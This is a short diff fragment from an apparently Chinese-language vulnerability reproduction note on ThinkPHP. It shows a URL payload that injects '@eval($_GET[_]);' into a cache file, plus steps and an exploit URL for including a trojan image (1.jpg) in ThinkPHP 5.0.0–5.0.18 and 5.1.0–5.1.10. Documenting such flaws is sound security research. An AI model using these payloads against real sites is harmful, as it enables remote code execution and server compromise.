@@ -278,3 +278,11 @@ class Index
 ```
 /public/?username=mochazz123%0d%0a@eval($_GET[_]);//
 ```
+
+
+^
+## **Thinkphp5文件包含木马**
+**5.0.0<=ThinkPHP5<=5.0.18** 、**5.1.0<=ThinkPHP<=5.1.10**。
+并将图片马 **1.jpg** 放至 **public** 目录下（模拟上传图片操作）。接着访问 **http://localhost:8000/index/index/index?cacheFile=1.jpg**
+
+
